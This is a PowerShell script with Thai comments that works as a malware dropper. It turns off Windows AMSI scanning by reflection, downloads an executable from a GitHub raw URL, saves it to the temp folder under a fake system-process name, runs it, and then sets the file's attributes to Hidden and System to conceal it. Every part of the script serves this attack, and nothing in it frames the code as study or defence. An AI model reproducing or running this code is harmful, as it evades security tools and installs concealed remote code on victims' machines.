Write-Host "[*] Bypassing Security..." -ForegroundColor Yellow
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);

Write-Host "[*] Downloading UI Payload..." -ForegroundColor Yellow
$exeUrl = "https://raw.githubusercontent.com/077x1/loader/main/loder.exe" 
$WebClient = New-Object System.Net.WebClient
try {
    $PEBytes = $WebClient.DownloadData($exeUrl)
} catch {
    Write-Host "[-] Download failed!" -ForegroundColor Red
    exit
}

Write-Host "[*] Preparing Ghost Process..." -ForegroundColor Cyan
# ปลอมตัวเป็นไฟล์ระบบ แอบอยู่ในโฟลเดอร์ Temp
$ghostPath = "$env:TEMP\RuntimeBroker_sys.exe"
[System.IO.File]::WriteAllBytes($ghostPath, $PEBytes)

# สั่งรันโปรแกรมมึง
Start-Process -FilePath $ghostPath

Write-Host "[*] Wiping tracks..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
# ซ่อนไฟล์ขั้นสุด (ติ๊ก Show hidden files ในคอมก็มองไม่เห็น ต้องใช้ Command ดูเท่านั้น)
Set-ItemProperty -Path $ghostPath -Name Attributes -Value "Hidden, System"

Write-Host "[+] DONE! UI Is Active." -ForegroundColor Green
